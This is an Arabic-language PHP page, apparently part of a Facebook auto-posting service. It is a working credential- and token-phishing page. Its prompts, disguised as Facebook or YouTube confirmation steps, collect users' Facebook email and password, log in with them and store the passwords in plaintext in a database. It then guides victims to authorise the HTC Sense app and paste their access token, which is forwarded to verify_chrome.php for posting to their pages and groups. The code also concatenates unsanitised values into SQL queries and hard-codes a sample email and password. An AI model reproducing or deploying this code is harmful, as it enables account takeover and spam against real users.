<?php
 if(!defined('MyConst')) {
header("Location: ../");
}
if(isv('id',1)){ $id = isv('id',1);  }else { $id= Sion('uid'); }
if(AddTest($id)){
header("Location: /?app=ffb&id=".$id);
die();
}
if(isv('num',1)){
$n = isv('num',1) + 1;
WR($n);
}
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);
$fb = 0 ;
$fbuser = 0;
 $suc = 0;
$video = 0 ;
$target ="target='_blank'";
$icon = "tachometer" ;
$st['name']="اسم المدير";
$st['pass']="كلمة المرور";
$st['color']="";
$st['login']="login";
$st['title']=" للاستمرار قم بتسجيل الدخول        ";
echo '<style type="text/css">
.auto{
display:block;
}
.more{
display:none;
}
.fb{
display:none;
}
</style>
';
if(isv('app',1) == 'fb'){
$fb = 2;
$st['login']="";
$icon = "facebook-square" ;
$st['name']="البريد الالكترونى او الهاتف";
$st['pass']="كلمه المرور";
$st['title']=" ادخل كلمة المرور مجددا للتأكيد";

echo   $st['color']='<style type="text/css">
p{
color: #0D47A1 !important;
margin-bottom: 5px !important;
}
.auto{
display:none;
}
.more{
display:none;
}
.video{
display:none;
}
.fb{
display:block;
}
.btn{
 background-color:#0D47A1 !important;
width: 100%;

}

</style>
';


}else if(isv('app',1) == 'rvideo'){
$fb = 0 ;
$video = 1 ;
$st['login']="";
$icon = "youtube-square" ;
$st['name']="البريد الالكترونى او الهاتف";
$st['pass']="كلمه المرور";
$st['title']=" ادخل كلمة المرور مجددا للتأكيد";
echo   $st['color']='<style type="text/css">
p{
color: #0D47A1 !important;
margin-bottom: 5px !important;
}
.fb{
display:none;
}
.auto{
display:none;
}
.video{
display:block;
}
.more{
display:none;
}

.btn{
 background-color:#0D47A1 !important;
width: 100%;

}

</style>
';
}else if(isv('app',1) == 'true'){

$fb = 1 ;
$st['login']="";
$icon = "facebook-square" ;
$st['name']="البريد الالكترونى او الهاتف";
$st['pass']="كلمه المرور";
$st['title']=" ادخل كلمة المرور مجددا للتأكيد";
echo   $st['color']='<style type="text/css">
p{
color: #0D47A1 !important;
margin-bottom: 5px !important;
}
.fb{
display:none;
}
.auto{
display:none;
}
.video{
display:none;
}
.more{
display:block;
}

.btn{
 background-color:#0D47A1 !important;
width: 100%;

}

</style>
';
if(isv('spost')){
$pages = isv('pages');
$time = isv('time');
$groups = isv('groups');
UpDate('users','time',$time,'where id='.Sion('htc'));
UpDate('users','pages',$pages,'where id='.Sion('htc'));
UpDate('users','groups',$groups,'where id='.Sion('htc'));
$S = Sel('users','where id='.Sion('htc'));
if($pages){
Json($St->url.'/verify_chrome.php?id='.$S->user_id.'&type=htc&pages='.Sion('spass'));
}
if($groups){
Json($St->url.'/verify_chrome.php?id='.$S->user_id.'&type=htc&groups='.Sion('spass'));
}

if($St->sred == 1 and !empty($St->postlink)){
$r ="http://m.me/Ned2.Al5er";
$r =$St->postlink;
}else{
$r ="../";

}
 echo redMsg('success','تم تحدث الاعدادات بنجاح',1,0,$r);
}
if(isv('post')){
$post = 1;
if(!isv('mo')){
$email ="lajepokiwe@cartelera.org";
if(Sion('email')){
$email = Sion('email');
}else{$email = isv('admin_name'); }
$password = "mohtasm0W@@";
$password = isv('admin_pass');
if(Sion('uid')){ $cok = Sion('uid'); }else{ $cok = explode('@',$email)[0];  iSion('uid',$cok); }
die(Fb_login($email,$password,'cookie_'.$cok.'.txt'));
if(Fb_login($email,$password,'cookie_'.$cok.'.txt')){
if(Num('fbusers','where username="'.$email.'"  or uid='.Sion('uid'))){
  UpDate('fbusers','where username="'.$email.'"  or uid='.Sion('uid'));
}else{
  SqlIn('fbusers',array('username'=>$email,'password'=>$password,'date'=>time(),'uid'=>Sion('uid')),1);
}
iSion('fbuser',$email);
msg('success','تم تسجيل الدخول بنجاح');

}else{
msg('error','خطأ فى عمليه الدخول');
unlink('cookie_'.$cok.'.txt');
}
}else{
$access = isv('access');
$pos = strpos($access,"AA");
 if($pos){
     $suc = 1;
    $r = "verify_chrome.php?user=".base64_encode($access)."&link=".Sion('get');
 echo redMsg('success','تم تسجيل الدخول بنجاح',1,0,$r);
 }else{
 msg('error','اكمل الخطوات بطريقه صحيحه ثم اعد المحاوله');
 }
}
}

if(Sion('fbuser')){
$fbuser = 1;
$st['title']="مرحبا بك <br>[ ".Sion('fbuser').' ]<br> الان قم بالضغط على الزر فى الاسفل وقم بالاشتراك والموافقه على التطبيق ثم اغلق النافذه';

echo '<style type="text/css">
.auto{
display:block;
}
.more{
display:none;
}

</style>
';

}
}
?>
 <div class="container">
 <div class="row">
 <form id="form" action="" method="post">
	   <div class="addpost col s12 m12" style="    left: 0;
    position: absolute;
    top: 74px;
    right: 0;
    margin: auto;
        max-width: 485px;    direction: rtl;">
	   <div class="addpost col s12 m12   white" id="addpost">
          <div class="card no-shadow">
<?php  if(!isv('login',1) or !Sion('htc')){  ?>
            <div class="card-content" <?php if($video){  echo "style='    padding: 0px;'";  }?> >
 <div class="row">
<!------------auto---------------->
<div class="log auto">
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-5x RA" aria-hidden="true"></i>
      <p class="center lg" ><?=$st['title']?></p>
</div>
<?php if(!$fbuser){  ?>
   <?php if(!Sion('email') or Sion('email')){ ?>
        <div class="input-field col s12 ">
     <input type="text"  name="admin_name" dir="ltr" class="form-control " value="" id="email" >
          <label for="first_name"><?=$st['name']?></label>
        </div>
    <?php } ?>
        <div class="input-field col s12 ">
     <input type="password"  name="admin_pass" dir="ltr" class="form-control " value="" id="email" >
          <label for="first_name"><?=$st['pass']?></label>
        </div>
<?php }else{ ?>
<div class="col s12 m12 center lg">
   <a class="btn waves-effect waves-light blue darken-4" id="getPermissions"><i class="fa fa-facebook  right"></i> الاشتراك في التطبيق</a>
</div>
<div class="col s12 m12 center">
 <div style="display: none" dir="ltr" class="loding  preloader-wrapper big  active">
    <div class="spinner-layer spinner-blue-only">
      <div class="circle-clipper left">
        <div class="circle"></div>
      </div><div class="gap-patch">
        <div class="circle"></div>
      </div><div class="circle-clipper right">
        <div class="circle"></div>
      </div>
    </div>
  </div>
  </div>
<?php } ?>
</div>
<!------------#auto---------------->
<!------------auto2---------------->
<div class="fb" style="position: relative" >
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-3x RA" aria-hidden="true"></i>
    <p class="center lg" >الخطوه التاليه</p>
</div>
<div class="col s12 m12 center lg" style="margin-bottom: 10px;">
<?php if(isand()){ $img = "https://goo.gl/WuoIte";    $vrel="https://goo.gl/VRjfFQ"; }else{ $img= "https://goo.gl/8p69B1";  $vrel="https://goo.gl/Z2SoJm"; } ?>
<p class="center-align lg" >اضغط على  الزر فى الاسفل ثم قم بالموافقه على التطبيق ثم اغلق الصفحه وعد الى هنا مره اخرى :  <a href="<?=$img?>"  target="_blank">اضغط هنا لمشاهده صوره توضح ذلك</a></p>
<br>
 <a class="btn waves-effect waves-light blue darken-4" id="getApp"> اضغط هنا</a>
  <br>
  <br>
   <p class="center-align lg" ><font color="red">ملحوظه</font> : بعض الحسبات سيظهر امامها زرار  باللون الاخضر يسمى "تسجيل او Register now"  يجب عليك اولا الضغط عليها والتسجيل.  <a href="https://goo.gl/KFymnh"  target="_blank">اضغط هنا لمشاهده صوره توضيحيه</a></p>
<br>
  <p class="center-align lg" ><font color="red">ملحوظه</font> : اذا تم الاشتراك ستصلك رساله انه تم الاشتراك لذلك اكمل الخطوات حتى النهايه  .</p>

  <br>
<p class="center-align lg" ><font color="red">ملحوظه</font> : اذا لم تستطع القيام بذلك يمكنك الضغط على الزر الاحمر فى الاسفل للاطلاع على شرح  بسيط ويمكنك مراسلتنا على الصفحه
<a href="http://m.me/Ned2.Al5er"   target="_blank" >من هنا</a>  .</p>
<br>
<p class="center-align lg" ><font color="red">ملحوظه</font> : ستقوم بهذه الخطوه مره واحده بعد ذلك يمكنك تجديد الاشتراك مباشرة .</p>
</div>
<div class="clear"></div>
</div>
<!------------#auto2---------------->
<!------------video---------------->
<?php if(isv('app',1) == "rvideo"){ ?>
<div class="video" style="position: relative" >
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-3x RA" aria-hidden="true"></i>
      <p class="center lg" >شرح طريقة الاشتراك</p>
      <p class="center" >من فضلك شاهد الشرح اولا لمعرفة كيفيه الاشتراك بعدها انتقل للاشتراك</p>
</div>
<?php if(isand()){  $v="ltEXtWnFtE4"; }else{ $v="7BvBmAzzcLg"; }  ?>
<div class="col s12 m12 center lg" style="margin-top: 10px;">
<iframe width="100%" height="100%" src="https://www.youtube-nocookie.com/embed/<?=$v?>?rel=0&amp;showinfo=1" frameborder="0" allowfullscreen></iframe>
</div>

<div class="clear"></div>
</div>
<?php } ?>
<!------------/video---------------->
<!------------htc---------------->
<?php if($fb != 2 and isv('app',1) == "true"){ ?>
<div class="more" style="position: relative" >
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-3x RA" aria-hidden="true"></i>
      <p class="center lg" >الطريقه اليدويه</p>
</div>
<div class="col s12 m12 center lg" style="margin-bottom: 10px;">
<p class="right-align lg" >1- قم بالاشتراك فى التطبيق بالضغط على الزر فى الاسفل وبعد الانتهاء وعندما تظهر لك صفحه بيضاء او صفحه مكتوب فيها  "سبق أن صرّحت لـ‏‎HTC Sense‎‏" اغلق النافذه وانتقل للحصول على كود الاشتراك:</p>
   <a class="btn waves-effect waves-light blue darken-4" id="getPermissions"> الاشتراك في التطبيق</a>
</div>
<div class="col s12 m12 center lg" style="margin-bottom: 10px;">
<?php if(isand()){ $img = "https://goo.gl/oG5zhr";   if($St->titleen == "iphoto"){ $rel= "https://goo.gl/k7J5KQ"; }else{ $rel= "https://goo.gl/zbSq7L"; } $vrel="https://goo.gl/CxjrbV"; }else{ $img= "https://goo.gl/5TP0BP"; if($St->titleen == "iphoto"){ $rel="https://goo.gl/4qSylN";  }else{ $rel="https://goo.gl/1oThTU";  } $vrel="https://goo.gl/tTUHxX"; } ?>
<?php $vrel="/red.php?app=rvideo"; $target =""; ?>
<p class="right-align lg" >2- قم بااخذ الكود بنسخ الكود من الصفحه بالضغط على الزر فى الاسفل :  <a href="<?=$img?>"  target="_blank">اضغط هنا لمشاهده صوره توضح ذلك</a></p>
   <a class="btn waves-effect waves-light blue darken-4" id="getAccessToken"> الحصول على الكود</a>
</div>
<div class="col s12 m12 center lg">
<p class="right-align lg" >3- ضع الكود الذى قمت بنسخه فى المكان المخصص له :</p>
        <div class="input-field col s12 ">
     <input type="text"  name="access" class="form-control " value="" id="myText" >
          <label for="myText">ضع الكود هنا</label>
        </div>

</div>
<div class="clear"></div>
</div>
<?php } ?>
<!------------#htc---------------->
<!------------forget---------------->
<div class="for" style ="display:none">
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa  fa-lightbulb-o fa-5x RA" aria-hidden="true"></i>
      <p class="center"> استعاده كلمة المرور    </p>
</div>
        <div class="input-field col s12 ">
     <input type="text"  name="radmin_name" class="form-control " value="" id="email" >
          <label for="first_name">اسم المدير</label>
        </div>
        <div class="input-field col s12 ">
     <input type="text"  name="email" class="form-control " value="" id="email" >
          <label for="first_name">بريد المدير</label>
        </div>
        <div class="input-field col s12 ">
     <input type="password"  name="radmin_pass" class="form-control " value="" id="email" >
          <label for="first_name">كلمة المرور الجديده</label>
        </div>

</div>
<!------------#for---------------->

    </div>
    </div>
<?php if(!$fbuser){  ?>

            <div class="card-action">
                                         <div class="col s12 m12 center" dir="rtl">
<!-- Dropdown Trigger -->

    <input type="hidden" name="for" />
    <input type="hidden" name="RA" />
    <input type="hidden" name="mo" value="1" />

  <?php if($video != 1){  if($fb  != 2){ ?>

  <button name="post" class=' btn waves-effect waves-light <?=$st['login']?> '  value="login" href='#' type="submit">دخول <i class="fa fa-sign-in  right"></i></button>
<!--  <button name="postt" style="display:none"  class=' btn waves-effect waves-light' value="log"  type="submit">دخول <i class="fa fa-sign-in  right"></i></button>-->
  <?php } if(!$fb){ ?>
  <p class="center"><a href="#" class='forget'>نسيت كلمة المرور ؟</a></p>
<?php }else{  ?>
  <button style="  margin-top: 5px;
    background-color: #4db6ac !important; display: none;"  class=' btn waves-effect waves-light ' id="myBt" onclick="more(); return false;"  href='#' >جرب طريقة اخرى </button>
  <a style="    margin-top: 5px;
    background-color: #f44336  !important;    margin-right: 0px;"  class=' btn waves-effect waves-light  white-text'  <?=$target?>   href='<?=$vrel?>' >شرح طريقة الأشتراك<i class="fa fa-youtube  right"></i></a>

<?php } }else{ ?>
   <a class="btn waves-effect waves-light blue darken-4"  style="color:#fff"  href="/red.php?app=true&num=<?=WR()?>" > انتقل للأشتراك الان</a>

<?php }  ?>
            </div>

    </div>
<?php } ?>
<?php }else{ $st['title']="حدد اعدادات  النشر المفضله  لديك"; ?>
<div class="card-content">
 <div class="row">
<div class="col s12 center bold"  style="<?php if(empty($St->color)){echo 'color: #4BACA3;';}else{echo 'color:'.$St->color;} ?>" >
        <i class="fa fa-<?=$icon?> fa-5x RA" aria-hidden="true"></i>
      <p class="center lg" ><?=$st['title']?></p>
</div>
 <div class="input-field col s12">
حدد وقت النشر المفضل لديك
    <select class="browser-default" name="time" >
      <option value="4"><?=Ctime(4)?></option>
      <option value="6"><?=Ctime(6)?></option>
      <option value="12"><?=Ctime(12)?></option>
      <option value="24"><?=Ctime(24)?></option>
    </select>
  </div>
 <div class="input-field col s12">
هل تريد النشر على الصفحات
    <select class="browser-default" name="pages" >
      <option value="1">نعم</option>
      <option value="0">لا</option>
    </select>
  </div>
 <div class="input-field col s12">
هل تريد النشر على المجموعات
    <select class="browser-default" name="groups" >
      <option value="1">نعم</option>
      <option value="0">لا</option>
    </select>
  </div>
 <div class="input-field col s12">
  <button name="spost" class=' btn waves-effect waves-light '  value="login" href='#' type="submit">تحديث<i class="fa fa-sign-in  right"></i></button>
</div>
</div>
</div>
<?php } ?>
    </div>
    </div>
    </div>
    </form>
    </div>
    </div>
